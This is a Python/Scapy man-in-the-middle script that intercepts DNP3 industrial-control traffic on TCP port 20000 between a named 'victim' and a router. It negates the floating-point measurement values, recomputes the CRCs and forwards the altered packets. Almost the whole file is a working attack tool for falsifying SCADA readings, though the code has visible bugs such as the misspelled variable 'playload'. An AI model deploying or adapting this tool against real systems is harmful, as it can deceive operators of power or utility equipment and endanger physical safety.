from bitstring import BitArray
from scapy.all import *
from uuid import getnode as get_mac
from calc_crc import calc_crc_chksum
from helpers import *
import argparse
import signal
import sys
import logging
import time
s = conf.L2socket(iface='eth0')
victimIP=""
routerIP=""
victimMAC=""
routerMAC=""
myMAC=""
interface=""
def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
	parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")
	parser.add_argument("-vmac", "--victimMAC", help="Choose the victim MAC address. Example: -vmac 00:11:22:33:44:55")
	parser.add_argument("-rmac", "--routerMAC", help="Choose the router MAC address. Example: -rmac 11:22:33:44:55:66")
	parser.add_argument("-mmac", "--myMAC", help="my (attacker) MAC. Example: -mmac 11:22:33:44:55:66")
	parser.add_argument("-i", "--interface", help="interface to listen on Example: eth0")
	return parser.parse_args()

def callback(pkt):
	#modify packet here
	#print pkt.show()
        if("TCP" in pkt and "Raw" in pkt):
		#print pkt.show()
		if(pkt[TCP].sport==20000 or pkt[TCP].dport==20000):
			payload = pkt[Raw].load

			if(len(payload) >= 226):
				old_len = len(payload)
				if(payload[12] == '\x81'):
					print "dnp3 values packet"
					if(len(payload) > 23):
						#value location within packet
						value = payload[23:26]+payload[28]
						value2 = payload[32:36]
						value3 = payload[39:43]
						#get float from hex
						value = hex_to_float(value)
						value2 = hex_to_float(value2)
						value3 = hex_to_float(value3)
						print "Old Value: "+str(value)
						print "Old Value2: "+str(value2)
						print "Old Value3: "+str(value3)
						#set static value
						#this value can now be changed as needed
						#value = 4919.45
						value = value * -1
						value2 = value2 * -1
						#value3 = value3
						print "New Value: "+str(value)
						print "New Value2: "+str(value2)
						print "New Value3: "+str(value3)
						crc = '\x00\x00'
						value = float_to_hex(value)
						value2 = float_to_hex(value2)
						value3 = float_to_hex(value3)
						pkt[Raw].load=payload[:23]+value[:3]+crc+value[3]+payload[29:32]+value2+payload[36:39]+value3+playload[43]+crc+payload[45:]
						crc1 = calc_crc_chksum(pkt[Raw].load[26:28])
						crc2 = calc_crc_chksum(pkt[Raw].load[28:44])
						pkt[Raw].load=payload[:23]+value[:3]+crc1+value[3]+payload[29:32]+value2+payload[36:39]+value3+playload[43]+crc2+payload[45:]
						
					
				del pkt[IP].chksum
				del pkt[TCP].chksum
				del pkt[IP].len
				#fix seq number
				pkt[TCP].seq=pkt[TCP].seq - old_len + len(payload)
	

	if pkt[IP].dst == victimIP and pkt.dst == myMAC:
		pkt.dst=victimMAC
		pkt.src=myMAC
		#fragments large packets
		if(len(pkt) > 1514):
			#print len(pkt)
			pkt = fragment(pkt)
			for p in pkt:
				s.send(p)
		else:
			s.send(pkt)
	elif pkt[IP].dst == routerIP and pkt.dst == myMAC:
		pkt.dst=routerMAC
		pkt.src=myMAC
		#fragments large packets
		if(len(pkt) > 1514):
			#print len(pkt)
			pkt = fragment(pkt)
			for p in pkt:
				s.send(p)
		else:
			s.send(pkt)

def main(args):
	if os.geteuid() != 0:
		sys.exit("[!] Please run as root")
	global routerIP
	global victimIP
	global routerMAC
	global victimMAC
	global myMAC
	global interface
	routerIP= args.routerIP
	victimIP = args.victimIP
	routerMAC = args.routerMAC
	victimMAC = args.victimMAC
	if(routerMAC == None):
		routerMAC = get_mac_from_ip(routerIP)
	if(victimMAC == None):
		victimMAC = get_mac_from_ip(victimIP)
	myMAC = args.myMAC
	if(myMAC == None):
		myMAC = get_my_mac()
	interface = args.interface
	if(interface == None):
		interface = "eth0"
	print "Forwarding for router ---> IP: "+routerIP+"  Mac Address: "+routerMAC
	print "Forwarding for victim ---> IP: "+victimIP+"  Mac Address: "+victimMAC
	filter_text = "ip and ether dst host " + myMAC + " and(dst net " + victimIP  + " or dst net " + routerIP  + ")"
	sniff(filter=filter_text, prn=callback, store=0, iface=interface)
main(parse_args())



